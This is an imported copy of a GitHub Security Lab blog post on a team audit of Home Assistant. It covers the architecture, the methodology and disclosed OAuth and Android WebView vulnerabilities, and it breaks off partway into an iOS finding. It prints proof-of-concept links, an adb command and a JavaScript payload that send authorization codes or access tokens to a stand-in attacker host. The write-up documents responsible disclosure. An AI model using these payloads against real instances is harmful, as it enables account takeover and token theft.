---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-11-30_securing-our-home-labs-home-assistant-code-review.md
original_filename: 2023-11-30_securing-our-home-labs-home-assistant-code-review.md
title: 'Securing our home labs: Home Assistant code review'
category: documents
detected_topics:
- oauth
- supply-chain
- ssrf
- command-injection
- api-security
- mobile-security
tags:
- imported
- documents
- oauth
- supply-chain
- ssrf
- command-injection
- api-security
- mobile-security
language: en
raw_sha256: 4d392edb8596c9bb8dbc1a1cd195d84a5377c5e4190c45275d94cfff5c8c1388
text_sha256: 97fcfd767b885ecb177cbf3e585911e56aa76c8dad56831336e2cd52259b033d
ingested_at: '2026-06-28T07:32:27Z'
sensitivity: unknown
redactions_applied: true
---

# Securing our home labs: Home Assistant code review

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-11-30_securing-our-home-labs-home-assistant-code-review.md
- Source Type: markdown
- Detected Topics: oauth, supply-chain, ssrf, command-injection, api-security, mobile-security
- Ingested At: 2026-06-28T07:32:27Z
- Redactions Applied: True
- Raw SHA256: `4d392edb8596c9bb8dbc1a1cd195d84a5377c5e4190c45275d94cfff5c8c1388`
- Text SHA256: `97fcfd767b885ecb177cbf3e585911e56aa76c8dad56831336e2cd52259b033d`


## Content

---
title: "Securing our home labs: Home Assistant code review"
page_title: "Securing our home labs: Home Assistant code review - The GitHub Blog"
url: "https://github.blog/2023-11-30-securing-our-home-labs-home-assistant-code-review/"
final_url: "https://github.blog/security/vulnerability-research/securing-our-home-labs-home-assistant-code-review/"
authors: ["Alvaro Muñoz (@pwntester)"]
programs: ["Home Assistant"]
bugs: ["Insecure deserialization", "CSRF", "RCE", "Code injection", "Android", "iOS", "Security code review"]
publication_date: "2023-11-30"
added_date: "2024-01-29"
source: "pentester.land/writeups.json"
original_index: 659
---

[Home](https://github.blog/) / [Security](https://github.blog/security/) / [Vulnerability research](https://github.blog/security/vulnerability-research/)

# Securing our home labs: Home Assistant code review

The GitHub Security Lab examined the most popular open source software running on our home labs, with the aim of enhancing its security. Here’s what we found and what you can do to better protect your own smart home.

![](https://github.blog/wp-content/uploads/2023/11/Security-LightMode-4.png?resize=1200%2C630)

[Alvaro Munoz](https://github.blog/author/pwntester/ "Posts by Alvaro Munoz")·[@pwntester](https://github.com/pwntester)

November 30, 2023  | Updated December 18, 2023 

| 30 minutes 

  * Share: 
  * [ ](https://x.com/share?text=Securing%20our%20home%20labs%3A%20Home%20Assistant%20code%20review&url=https%3A%2F%2Fgithub.blog%2Fsecurity%2Fvulnerability-research%2Fsecuring-our-home-labs-home-assistant-code-review%2F)
  * [ ](https://www.facebook.com/sharer/sharer.php?t=Securing%20our%20home%20labs%3A%20Home%20Assistant%20code%20review&u=https%3A%2F%2Fgithub.blog%2Fsecurity%2Fvulnerability-research%2Fsecuring-our-home-labs-home-assistant-code-review%2F)
  * [ ](https://www.linkedin.com/shareArticle?title=Securing%20our%20home%20labs%3A%20Home%20Assistant%20code%20review&url=https%3A%2F%2Fgithub.blog%2Fsecurity%2Fvulnerability-research%2Fsecuring-our-home-labs-home-assistant-code-review%2F)

## Introduction

In July, the GitHub Security Lab team conducted a collaborative review of one of our favorite software pieces. While it’s not uncommon for our Security Lab researchers to work together on audits and research projects, we found that conducting team audits occasionally provides a valuable opportunity for team members to learn from each other and expand the scope of the review beyond what could be accomplished individually or in pairs. You can read about other team audits we have done, such as the one for [Datahub](https://github.blog/2023-03-03-github-security-lab-audited-datahub-heres-what-they-found/).

Each team member can suggest different targets, and every few months we vote on which project to audit and dedicate a week to review the target project as a team. This time, the decision was easy as most of the team chose to review the Home Assistant smart-home platform. The reasons for this choice are twofold: it is [the most popular open source smart home platform](https://github.blog/2023-11-08-the-state-of-open-source-and-ai/#the-state-of-open-source) but also used by some of our team members and many Hubbers, so it will help secure our own homes. It was a win-win situation! 😉

## Securing the supply chain by securing our developer’s home labs

Developer systems are like the keys to a kingdom. They store all the credentials needed to access a company’s internal network and production systems. If a developer’s private key is leaked, an attacker can gain access to the corporate networks. Even small things like environment variables can be valuable. This includes passwords for proxy servers, tokens for pipelines, and more—all things that should not fall into the wrong hands. It is crucial to secure developers’ systems, not just their workstations or laptops. Their entire home networks and servers can be targeted in a supply chain attack. If a server on their home network is compromised, attackers can potentially access other servers or workstations and obtain substantial credentials.

As tech enthusiasts, we enjoy running various self-hosted services in our home labs. These services range from smart home systems for controlling lighting to media servers, NAS systems, camera recording systems, and more. At the GitHub Security Lab, we have decided to examine the most popular open source software running on our home labs with the aim of enhancing their security.

### Previous research

We leveraged the great research by the elttam Pty Ltd security research team published on their blog and entitled, “[Pwnassistant: Controlling Home’s Via A Home Assistant RCE](https://www.elttam.com/blog/pwnassistant/).” This blog provides a thorough explanation of Home Assistant’s architecture, its attack surface, and the vulnerabilities that were discovered. It proved to be extremely helpful in allowing the team to quickly understand how Home Assistant was designed and identify the areas of interest for our audit. Little did we know that Cure53 was tasked with performing a security audit of HomeAssistant that slightly predated our team audit. It so happened that two of our findings were actually duplicates. (A thing not only limited to bug bounty programs 😉.)

## Home Assistant architecture

Even though the blog post from elttam mentioned earlier provides a thorough explanation of the Home Assistant architecture, we will provide a concise description here for clarity.

It’s important to note that Home Assistant (HASS) can be installed in four different ways. However, we will primarily focus on the most common and recommended installation method, which is the Home Assistant Operating System (HAOS). HAOS utilizes a Linux-based operating system and runs the different HASS components within Docker containers. The key components are the Supervisor and the Core.

![](https://github.blog/wp-content/uploads/2023/11/image4.png?w=1024&resize=1024%2C556)

### The Core

The Core of Home Assistant is a Python application that facilitates interaction between users and IoT devices. The Core delegates most of its tasks to integration modules. Think of integrations as the building blocks that form the Core. Some of these building blocks are essential components, such as the frontend, HTTP, and WebSocket layers. Others handle specific types of IoT devices and are only necessary if you have those devices in your smart home system.

It’s important to note that the Home Assistant team maintains a wide range of integrations, allowing Home Assistant to communicate with almost any IoT device available. Alongside the official integrations, there is a project called [HACS](https://hacs.xyz/) that maintains an impressive list of integrations for customizing your Home Assistant installation and adding unsupported devices. Due to time constraints during the audit, we did not examine these community integrations. However, it’s important to exercise caution when using them because they will have complete access to your Home Assistant installation, and any vulnerabilities in them could compromise your system.

### The Supervisor

The Supervisor has the responsibility of managing and updating key components of Home Assistant, including the Core and the operating system. It also deals with user-installed “add-ons,” which are extra features implemented as Docker containers. These add-ons can consist of tools, such as a VSCode editor, an SSH terminal, ESPHome, backups, an MQTT broker, or Zigbee2MQTT. The Supervisor offers an HTTP API that enables communication with the Core and the add-ons. However, by default, this API is not accessible externally and cannot be accessed even from the local network.

## Methodology used

As mentioned previously, this project was approached as a team audit, which requires coordinating the different people looking at the code and orchestrating the review of the different parts. To accomplish this, a comprehensive and systematic approach was adopted for the code review of Home Assistant, with the aim of identifying vulnerabilities and potential security concerns. The methodology employed can be summarized in the following steps:

  1. **Understanding the System**. The first step involved gaining a deep understanding of the Home Assistant architecture, key components, and functionalities. This included studying the documentation, reviewing relevant blog posts, installing a test server, and exploring the application to get a first impression of the attack surface and interesting components.
  2. **Identifying Attack Surfaces**. Once familiar with the system, the next step was to identify the various attack surfaces that could be targeted by potential attackers. Given the time constraints, we decided to focus on the remote attack surface, which included the frontend of the web application and the backend APIs, and leave the local attack surface such as malicious IoT devices that could interact with your server for future assessments. As we will see, this step is iterative because new discoveries can result in new attack surfaces.
  3. **Reviewing Authentication/Authorization Process**. The authentication and authorization process is critical for ensuring secure access to Home Assistant. A detailed review was conducted to identify any vulnerabilities or weaknesses in this process.
  4. **Analyzing the Codebase**. The codebase of Home Assistant is relatively large and reviewing it manually was beyond our time constraint. This is where automated static analysis tools, such as CodeQL, can be very helpful both as a way to explore an unfamiliar codebase (for example, listing the user-controllable elements within the application or listing the application hotspots where dangerous operations take place) and find vulnerabilities in an automated fashion.
  5. **Using Security Tools**. Once we identified the various attack surfaces and mapped them to the code handling those malicious inputs we used CodeQL and Burp Suite as the main drivers to explore the code for vulnerabilities.
  6. **Reporting Findings**. Throughout the code review process, any identified vulnerabilities or potential security issues were documented in detail and reported to the Home Assistant team using the [GitHub Private Vulnerability Reporting (PVR)](https://docs.github.com/code-security/security-advisories/guidance-on-reporting-and-writing-information-about-vulnerabilities/privately-reporting-a-security-vulnerability) functionality.
  7. **Validation Testing**. After reporting the vulnerabilities and providing recommendations for remediation, validation testing was conducted to ensure that proposed fixes effectively addressed the identified issues.

## A test environment with debugging support

Setting up at least one useful test environment can be one of the hardest parts of a security assessment. Luckily, in this case it wasn’t very hard to get a test setup up and running. The Home Assistant core project has a DevContainer setup committed to their main repository. This allows to start the project in a [GitHub Codespace](https://github.com/features/codespaces) directly on the [Home Assistant core repository](https://github.com/home-assistant/core):

![](https://github.blog/wp-content/uploads/2023/11/image2.png?w=842&resize=842%2C906)

But even better: the DevContainer is set up with a working debug configuration for Python! Once the DevContainer is created, it is possible to start Home Assistant by clicking on “Start Debugging” inside the Debug tab of VS Code:

![](https://github.blog/wp-content/uploads/2023/11/image9.png?w=1024&resize=1024%2C662)

This allows us to set breakpoints inside the Python code and view the actual values of variables on the server side as we go.

It is not always possible to get our hands on a test setup with debugging support that easily, but whenever it’s possible it can pay off quite quickly.

## Detailed review of findings

During the security code review of Home Assistant, several vulnerabilities and potential security issues were identified. In the following section we will describe some of the key findings but also try to show the process that led to these findings.

Home Assistant has a very narrow unauthenticated attack surface. That is, we will need to be authenticated to perform most of the actions within Home Assistant. This is, of course, very good from a security standpoint and drastically reduces the unauthenticated attack surface that an external attacker can interact with. As an attacker this leave us with few options:

  * Find bugs in the authentication/authorization mechanisms used.
  * Find bugs in the unauthenticated endpoints.
  * Find CSRF-like vulnerabilities which can force an authenticated user to attack themselves.

### Authentication/Authorization process review

One of the initial aspects we will review in an application is its user authentication and authorization. It is important to ensure that the application properly authenticates users and enforces their access to resources and actions. Bugs in these areas can potentially enable an attacker to bypass authentication mechanisms, impersonate legitimate users, or gain access to unauthorized resources.

Both the web and the mobile apps use the [OAuth 2 specification](https://tools.ietf.org/html/rfc6749) combined with the [OAuth 2 IndieAuth extension](https://indieauth.spec.indieweb.org/) to authorize themselves to access the Home Assistant API.

For authentication, a few providers are allowed but the default one is the “Home Assistant Auth Provider” which is based on username/password.

The OAuth2/IndieAuth flow is described in detail in the [Home Assistant documentation](https://developers.home-assistant.io/docs/auth_api/).

![](https://github.blog/wp-content/uploads/2023/11/image12.png?w=402&resize=402%2C327)

As the result of our review of the OAuth flow implementation we identified two vulnerabilities.

## CVE-2023-41893/GHSL-2023-164:Unrestricted OAuth2 Clients

Home Assistant currently does not have a feature to allow or disallow OAuth2 clients. This means that any OAuth2 client can be specified using the `client_id` parameter in the authorization request (`/authorize`). Although Home-Assistant informs the user with the message `You're about to give http:// access to your Home Assistant instance.`, it does not explicitly highlight this as a potential danger. The message appears the same whether the user signs in locally (displaying the hostname of the Home Assistant instance).

To exploit this, an attacker would need to create a link similar to the one below and deceive a victim into clicking on it and logging into their Home Assistant instance:
  
  
  http://homeassistant.local:8123/auth/authorize?response_type=code&redirect_uri=http%3A%2F%2Fhomeassistant.local.evil%3A8123%2F%3Fauth_callback%3D1&client_id=http%3A%2F%2Fhomeassistant.local.evil%3A812300%2F&state=eyJoYXNzVXJsIjoiaHR0cDovL2xvY2FsaG9zdDo4MTIzIiwiY2xpZW50SWQiOiJodHRwOi8vbG9jYWxob3N0OjgxMjMvIn0%3D
  

In this link, both the `redirect_uri` and `client_id` query parameters are modified to point to an attacker’s OAuth client running at `http://homeassistant.local.evil:8123`. It is important to note that the victim will still see their home assistant instance URL (`http://homeassistant.local:8123`) and they will be presented with the login page.

![](https://github.blog/wp-content/uploads/2023/11/image11.png?w=448&resize=448%2C338)

Even though the page clearly states that the victim is about to authorize `http://homeassistant.local.evil`, the message is not significantly different from the one they receive each time they log in using the legitimate client. Can you identify any differences between the previous malicious login form and the legitimate one below? (We could have made it less obvious than adding `.evil` 😄)

![](https://github.blog/wp-content/uploads/2023/11/image7.png?w=456&resize=456%2C342)

According to the [Authentication API documentation](https://developers.home-assistant.io/docs/auth_api/) this is by design:

_Before you can ask the user to authorize their instance with your application, you will need a client. In traditional OAuth2, the server needs to generate a client before a user can authorize. However, as each server belongs to a user, we’ve adopted a slightly different approach from[IndieAuth](https://indieauth.spec.indieweb.org/#client-identifier)._

_The client ID you need to use is the website of your application. The redirect url has to be of the same host and port as the client ID._

### Mitigation

Home Assistant [updated the look of this page](https://github.com/home-assistant/frontend/pull/17459) in the 2023.9 version to make it more clear in both for the web UI and mobile apps.

![](https://github.blog/wp-content/uploads/2023/11/image1.png?w=788&resize=788%2C798)

#### Timeline

  * 2023-07-17: Issue reported to [security@home-assistant.io](mailto:security@home-assistant.io).
  * 2023-08-28: A[ public issue](https://github.com/home-assistant/core/issues/99191) was opened to request an alternative security contact, as we hadn’t heard back.
  * 2023-08-28: Home Assistant informed us that they moved to [GitHub Private Vulnerability Reporting](https://docs.github.com/code-security/security-advisories/guidance-on-reporting-and-writing-information-about-vulnerabilities/privately-reporting-a-security-vulnerability).
  * 2023-08-28: Issue reported through GitHub Private Vulnerability Reporting.
  * 2023-08-28: Home Assistant informed us of the report collision with a different audit and shared a [fix commit](https://github.com/home-assistant/frontend/pull/17459) with us.
  * 2023-09-06: Fix was released in [2023.9 version](https://www.home-assistant.io/blog/2023/09/06/release-20239/)
  * 2023-09-14: CVE-2023-41893 assigned to this issue.
  * 2023-10-20: [Advisory](https://github.com/home-assistant/core/security/advisories/GHSA-qhhj-7hrc-gqj5) published.

## CVE-2023-41896/GHSL-2023-163 Authorization Code Exfiltration

The authorization request, in addition to the `client_id` and `redirect_uri`, can also include a `state` parameter. According to the [official documentation](https://developers.home-assistant.io/docs/auth_api/#authorize), this parameter is used to store the instance URL that the user is authenticating with. This URL will then be added to the redirect URI.

In Home Assistant, the `state` parameter is not an opaque, random value like it’s recommended for OAuth2 based flows. Instead, it is a Base64-encoded JSON object that contains a `hassUrl` and a `clientId`.

During the web-based login flow, the value of `hassUrl` is utilized by client-side JavaScript code to make a POST request. This request contains the valid authorization code that was obtained from Home Assistant.

To parse the query string of the URL and decode the auth state, you can refer to the [source code](https://github.com/home-assistant/home-assistant-js-websocket/blob/c96cd23edcd9b839e33481b96ec0be11cd37c85c/lib/auth.ts#L264). This code also sends a POST request to the server indicated by the `hassUrl` property using the `fetchToken` function.
  
  
  const query = parseQuery(location.search.substr(1));
  // Check if we got redirected here from authorize page
  if ("auth_callback" in query) {
  // Restore state
  const state = decodeOAuthState(query.state);
  data = await fetchToken(state.hassUrl, state.clientId, query.code);
  if (options.saveTokens) {
  options.saveTokens(data);
  }
  }
  

If an attacker tricks a victim into logging into Home Assistant using a malicious link, they could steal the authorization codes. This would allow them to obtain valid refresh and access tokens from Home Assistant.

#### Proof of Concept (PoC)

An attacker can use their own malicious server as the `hassUrl` property of the `state` json:
  
  
  {
  "hassUrl":"http://homeassistant.local.evil:8123/",
  "clientId":"http://homeassistant.local:8123/"
  }
  

Once base64-encoded as `eyJoYXNzVXJsIjoiaHR0cDovL2hvbWVhc3Npc3RhbnQubG9jYWwuZXZpbDo4MTIzLyIsImNsaWVudElkIjoiaHR0cDovL2hvbWVhc3Npc3RhbnQubG9jYWw6ODEyMy8ifQ==`, it can be used to craft the malicious link:
  
  
  http://homeassistant.local:8123/auth/authorize?response_type=code&redirect_uri=http%3A%2F%2Fhomeassistant.local%3A8123%2F%3Fauth_callback%3D1&client_id=http%3A%2F%2Fhomeassistant.local%3A8123%2F&state=eyJoYXNzVXJsIjoiaHR0cDovL2hvbWVhc3Npc3RhbnQubG9jYWwuZXZpbDo4MTIzLyIsImNsaWVudElkIjoiaHR0cD***REDACTED-SUSPECT-TOKEN***Note that in this case, the host, `client_id`, and `redirect_uri` values are legitimate and expected by the user.

The victim is shown the login form along with the message: `You’re about to give http://homeassistant.local:8123/ access to your Home Assistant instance`. Please note that this is the user’s server instance, so there is nothing suspicious about it.

Once the user logs in, the authorization code is sent back to the attacker.
  
  
  POST /auth/token HTTP/1.1
  Host: homeassistant.local.evil:8123
  Content-Length: [..]
  User-Agent: Mozilla/5.0
  Content-Type: multipart/form-data; boundary=----***REDACTED-SUSPECT-TOKEN***  Accept: */*
  Origin: http://homeassistant.local:8123/
  Sec-Fetch-Site: cross-site
  Sec-Fetch-Mode: cors
  Sec-Fetch-Dest: empty
  Accept-Encoding: gzip, deflate
  Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
  Connection: close
  
  ------***REDACTED-SUSPECT-TOKEN***  Content-Disposition: form-data; name="client_id"
  
  http://homeassistant.local:8123/
  ------***REDACTED-SUSPECT-TOKEN***  Content-Disposition: form-data; name="code"
  
  ***REDACTED-SUSPECT-TOKEN***  ------***REDACTED-SUSPECT-TOKEN***  Content-Disposition: form-data; name="grant_type"
  
  authorization_code
  ------WebKitFormBoundaryOdg7W5BtZriAqa3J--
  

The attacker can now utilize the authorization code (`0122db4514c34af9be03bf62e8e9605c`) to obtain an `access_token` and `refresh_token` by sending a POST request to the `/auth/token` endpoint of the Home Assistant server. This unauthorized action could potentially result in remote code execution (RCE) on the Home Assistant instance.

### Mitigation

As an initial mitigation Home Assistant has [introduced](https://github.com/home-assistant/home-assistant-js-websocket/pull/394) a new feature called `limitHassInstance` in the `getAuth` function. When `limitHassInstance` is set to `true`, it restricts the values of `hassUrl` and `clientId` that Home Assistant will accept from the OAuth2 `state`. [By default](https://github.com/home-assistant/frontend/blob/b2cb0d8e0f14691553b00196c764f05bb7a38885/src/entrypoints/core.ts#L67), the value of `limitHassInstance` is set to `true`.

#### Timeline

  * 2023-07-17: Issue reported to [security@home-assistant.io](mailto:security@home-assistant.io).
  * 2023-08-02: Fix is released in [2023.8 version](https://www.home-assistant.io/blog/2023/08/02/release-20238/).
  * 2023-08-28: A[ public issue](https://github.com/home-assistant/core/issues/99191) was opened to ask for a different security contact.
  * 2023-08-28: Home Assistant informed us that they moved to [GitHub Private Vulnerability Reports](https://docs.github.com/code-security/security-advisories/guidance-on-reporting-and-writing-information-about-vulnerabilities/privately-reporting-a-security-vulnerability).
  * 2023-08-28: Issue reported through GitHub PVR.
  * 2023-08-28: Home Assistant informs us of the report collision with a different audit and shares a [fix commit](https://github.com/home-assistant/home-assistant-js-websocket/pull/394) with us.
  * 2023-09-14: CVE-2023-41896 is assigned to this issue.
  * 2023-10-20: [Advisory](https://github.com/home-assistant/core/security/advisories/GHSA-cr83-q7r2-7f5q) is published.

## Attack surface review

When conducting a review of a new software, one of the first steps is to map out the potential areas of attack. It’s important to have a clear understanding of what the application does and to identify all possible ways in which an attacker could interact with it.

During our review, we initially identified three attack vectors:

  * **Web application attack surface**. Home Assistant has both a [REST API](https://developers.home-assistant.io/docs/api/rest) and a [WebSocket API](https://developers.home-assistant.io/docs/api/websocket) that attackers could potentially exploit. However, most of these endpoints require authentication and are not highly relevant from an impact perspective. The [PwnAssistant blog post](https://www.elttam.com/blog/pwnassistant/) provides a comprehensive description of this attack surface and highlights some integrations that may expose unauthenticated endpoints worth investigating. We used CodeQL to model these integration endpoints and conducted manual reviews as well as standard CodeQL queries, but we did not find any security weaknesses.
  * **Local attack surface**. There is another attack surface that is exposed to all IoT devices capable of interacting with Home Assistant through various protocols (WiFi, Bluetooth, ZigBee, Thread, ZWave, etc.). These devices, along with the auto-discovery features, could potentially create an interesting attack vector. However, there is a limitation–the attacker would need physical proximity to the Home Assistant server. Given the time constraints of this team audit, exploring this attack surface was not feasible. Although it was not within the scope of this code review, it is important to consider securing Home Assistant by implementing proper network segmentation and firewall configurations to mitigate network-based attacks.
  * **Mobile apps attack surface**.The Home Assistant mobile companion apps also present an interesting attack vector. As users of these applications, we were aware that they require user login credentials and stay authenticated for future uses. Therefore, if an attacker gains control over these apps through third-party apps, or deep links, they could potentially access Home Assistant on our behalf. We conducted a thorough analysis of both the iOS and Android apps to identify potential security vulnerabilities. As a result, we discovered two specific vulnerabilities that were worth reporting.

## CVE-2023-41898/GHSL-2023-142:Arbitrary URL Load in Android WebView in MyActivity.kt

The Home Assistant companion app declares an exported [Activity](https://developer.android.com/reference/android/app/Activity) named `[MyActivity](https://github.com/home-assistant/android/blob/f17a9d338dca96686b1d09d12069a91fc47fc672/app/src/main/AndroidManifest.xml#L27)`:
  
  
  <activity android:name=".launch.my.MyActivity"
  android:exported="true">
  <intent-filter android:autoVerify="true">
  <action android:name="android.intent.action.VIEW" />
  <category android:name="android.intent.category.DEFAULT" />
  <category android:name="android.intent.category.BROWSABLE" />
  
  <data
  android:scheme="https"
  android:host="my.home-assistant.io"
  android:pathPrefix="/redirect/"/>
  </intent-filter>
  </activity>
  

Exported Activities are accessible to any Android apps installed on the same device, allowing them to interact with it by sending an [Intent](https://developer.android.com/reference/android/content/Intent). By examining the source code, we can observe how the Activity retrieves a URI from incoming Intents. You can find the code snippet [here](https://github.com/home-assistant/android/blob/f17a9d338dca96686b1d09d12069a91fc47fc672/app/src/main/java/io/homeassistant/companion/android/launch/my/MyActivity.kt#L40).
  
  
  val newUri = intent.data!!.buildUpon().appendQueryParameter("mobile", "1").build()
  

The next step involves setting up a WebView and loading the URI controlled by the user into it. You can find the code for this process [here](https://github.com/home-assistant/android/blob/f17a9d338dca96686b1d09d12069a91fc47fc672/app/src/main/java/io/homeassistant/companion/android/launch/my/MyActivity.kt#L46-L63).
  
  
  binding.webview.apply {
  settings.javaScriptEnabled = true // [1]
  webViewClient = object : WebViewClient() {
  override fun shouldOverrideUrlLoading(
  view: WebView?,
  request: WebResourceRequest?
  ): Boolean {
  val url = request?.url.toString()
  if (url.startsWith("homeassistant://navigate/")) {
  startActivity(WebViewActivity.newInstance(context, url.removePrefix("homeassistant://navigate/"))) // [2]
  finish()
  return true
  }
  return false
  }
  }
  }
  binding.webview.loadUrl(newUri.toString())
  

Note that this WebView not only enables JavaScript ([1]), but also overrides `shouldOverrideUrlLoading`. This method takes the URL being loaded and, if it starts with `homeassistant://navigate/`, it removes the prefix and sends the remaining URI to `WebViewActivity.newInstance()` as the `path` argument ([2]).

The `WebViewActivity.newInstance()` call wraps the `path` in an Intent, as shown in this [link](https://github.com/home-assistant/android/blob/f17a9d338dca96686b1d09d12069a91fc47fc672/app/src/main/java/io/homeassistant/companion/android/webview/WebViewActivity.kt#L133-L138). This Intent is later used to call `presenter.onViewReady(path)`, as shown in this [link](https://github.com/home-assistant/android/blob/f17a9d338dca96686b1d09d12069a91fc47fc672/app/src/main/java/io/homeassistant/companion/android/webview/WebViewActivity.kt#L1057jljjj).
  
  
  class WebViewActivity : BaseActivity(), io.homeassistant.companion.android.webview.WebView {
  
  companion object {
  const val EXTRA_PATH = "path"
  // --snip--
  
  fun newInstance(context: Context, path: String? = null, serverId: Int? = null): Intent {
  return Intent(context, WebViewActivity::class.java).apply {
  putExtra(EXTRA_PATH, path)
  putExtra(EXTRA_SERVER, serverId)
  }
  }
  }
  // --snip--
  
  override fun onWindowFocusChanged(hasFocus: Boolean) {
  super.onWindowFocusChanged(hasFocus)
  if (hasFocus && !isFinishing) {
  unlockAppIfNeeded()
  val path = intent.getStringExtra(EXTRA_PATH)
  presenter.onViewReady(path)
  // --snip--
  }
  }
  

The `presenter.onViewReady(path)` function is called, which triggers the `WebViewPresenterImpl.onViewReady()` function. This function loads our `path` into the WebView. Before loading, the `url` is processed using `UrlUtil.handle(url, path)`.

You can find the implementation of `loadUrl` in the [WebViewPresenterImpl.kt](https://github.com/home-assistant/android/blob/f17a9d338dca96686b1d09d12069a91fc47fc672/app/src/main/java/io/homeassistant/companion/android/webview/WebViewPresenterImpl.kt#L103-L104) file. The processing of the `url` is done at [line 93](https://github.com/home-assistant/android/blob/f17a9d338dca96686b1d09d12069a91fc47fc672/app/src/main/java/io/homeassistant/companion/android/webview/WebViewPresenterImpl.kt#L93) using the `UrlUtil.handle(url, path)` method.
  
  
  fun handle(base: URL?, input: String): URL? {
  return when {
  isAbsoluteUrl(input) -> {
  URL(input)
  }
  // --snip--
  }
  }
  
  fun isAbsoluteUrl(it: String?): Boolean {
  return Regex("^https?://").containsMatchIn(it.toString())
  }
  

The purpose of this method is to determine if the URL is absolute. If it is, the method wraps it in an `URL` object and returns it for loading. However, this approach poses a security risk as it allows an attacker to redirect the WebView to any URL of their choice, enabling them to execute JavaScript code.

In this particular context, an attacker can take advantage of the WebView’s inclusion of multiple `JavascriptInterface`s. These interfaces act as bridges with native code, facilitating calling Kotlin code from within JavaScript. One example of such a bridge is the `getExternalAuth` interface ([code](https://github.com/home-assistant/android/blob/f17a9d338dca96686b1d09d12069a91fc47fc672/app/src/main/java/io/homeassistant/companion/android/webview/WebViewActivity.kt#L590)).
  
  
  @JavascriptInterface
  fun getExternalAuth(payload: String) {
  JSONObject(payload).let {
  presenter.onGetExternalAuth(
  this@WebViewActivity,
  it.getString("callback"),
  it.has("force") && it.getBoolean("force")
  )
  }
  }
  

The function `WebViewPresenterImpl.onGetExternalAuth` gets the `callback` property from the provided `payload` string after decoding it from JSON and passes it to `onGetExternalAuth` which, in turn, will call `setExternalAuth` with a snippet of Javascript code constructed using the user-controlled `callback`:
  
  
  override fun onGetExternalAuth(context: Context, callback: String, force: Boolean) {
  mainScope.launch {
  try {
  view.setExternalAuth("$callback(true,  ${serverManager.authenticationRepository(serverId).retrieveExternalAuthentication(force)})")
  } catch (e: Exception) {
  // --snip--
  }
  }
  

The `setExternalAuth` function finally evaluates the Javascript code constructed with attacker-controlled data, which introduces a Cross-Site Scripting vulnerability.
  
  
  override fun setExternalAuth(script: String) {
  webView.post {
  webView.evaluateJavascript(script, null)
  }
  }
  

In this scenario, an attacker can create an exploit by using an arbitrary function as the `callback` parameter to steal the user’s external authentication token. Consequently, this vulnerability could result in the execution of arbitrary JavaScript code within a WebView, limited execution of native code, and potential theft of credentials.

#### PoC

An Intent targeting `MyActivity` can be used to start a local attack, that is, an attack made by a malicious or compromised application installed on the same device as Home Assistant Companion for Android.
  
  
  adb shell am start -n
  io.homeassistant.companion.android.debug/io.homeassistant.companion.android.launch.my.MyActivity -d '"https://attacker.acme/exploit"' -a android.intent.action.VIEW
  

That would redirect the initial WebView to `https://attacker.acme/exploit`, where it could serve content similar to the following:
  
  
  <html>
  <head>
  <script>
  document.location = "homeassistant://navigate/entityId:\"}}));externalApp.getExternalAuth('{\"callback\": \"function func(a,b){alert(b.access_token);};func\", \"force\": \"true\"}');//";
  </script>
  </head>
  <body>
  <h1>Nothing to see here</h1>
  </body>
  </html>
  

Note that the redirection includes `homeassistant://navigate/` to take advantage of the `shouldOverrideUrlLoading` function and access the `WebViewActivity`. Additionally, it appends `entityId:` to exploit the Cross-Site Scripting vulnerability. The payload would appear as follows after injection (line breaks added for clarity):
  
  
  document.querySelector("home-assistant").dispatchEvent(new CustomEvent("hass-more-info", {
  detail: {
  entityId: ""
  }
  }));
  externalApp.getExternalAuth('
  {
  "callback": "function func(a,b){ alert(b.access_token); }; func",
  "force": "true"
  }
  ');//}}))
  

Since `callback` is itself injected in another JavaScript code block, the final malicious code would look like the following:
  
  
  function func(a, b) {
  alert(b.access_token);
  }
  func(true, { access_token: "(user access token)", expires_in: (expiration int) } )
  

This code displays the external authentication access token of the user in an alert dialog.

![](https://github.blog/wp-content/uploads/2023/11/image8.png?w=469&resize=469%2C1024)

Note that CodeQL’s `java/android/unsafe-android-webview-fetch` query raises an alert for this vulnerability.

### Mitigation

The Home Assistant team quickly addressed this vulnerability in a number of ways:

  * [Close the main entry point by not allowing loading URLs with a host other than my.home-assistant.io](https://github.com/home-assistant/android/pull/3826).
  * [Validate entityId: to conform with the expected format disallowing arbitrary Javascript on its path](https://github.com/home-assistant/android/pull/3829).
  * [For the initial load, validate the constructed URL matches the server base URL (if not opening the URL outside the WebView)](https://github.com/home-assistant/android/pull/3831).

#### Timeline

  * 2023-07-17: Issue reported to [security@home-assistant.io](mailto:security@home-assistant.io).
  * 2023-08-28: A[ public issue](https://github.com/home-assistant/core/issues/99191) was opened to request an alternative security contact, as we hadn’t heard back.
  * 2023-08-28: Home Assistant informed us that they moved to [GitHub Private Vulnerability Reporting](https://docs.github.com/code-security/security-advisories/guidance-on-reporting-and-writing-information-about-vulnerabilities/privately-reporting-a-security-vulnerability).
  * 2023-08-28: Issue reported through GitHub Private Vulnerability Reporting.
  * 2023-09-10: Fix was released in [2023.9.2 version](https://github.com/home-assistant/android/releases/tag/2023.9.2).
  * 2023-09-13: CVE-2023-41898 assigned to this issue.
  * 2023-10-20: [Advisory](https://github.com/home-assistant/core/security/advisories/GHSA-jvpm-q3hq-86rg) published.

## CVE-2023-44385/GHSL-2023-161: Client-Side request forgery in iOS, macOS native apps

The companion apps for iOS/macOS have a feature that lets users call services and render templates using URL handlers. These URL handlers start with the `homeassistant://` scheme and can trigger actions like calling a service (`homeassistant://call_service`, `homeassistant://x-callback-url/call_service`) or rendering a template (`homeassistant://x-callback-url/render_template`). When users click on these links, the companion app, which should be already authenticated into Home Assistant, sends a request to the Home Assistant server to perform those actions for the user. This functionality also applies to [App Intents](https://developer.apple.com/documentation/appintents) used by Siri or Shortcuts apps, which can call any services or render any templates.

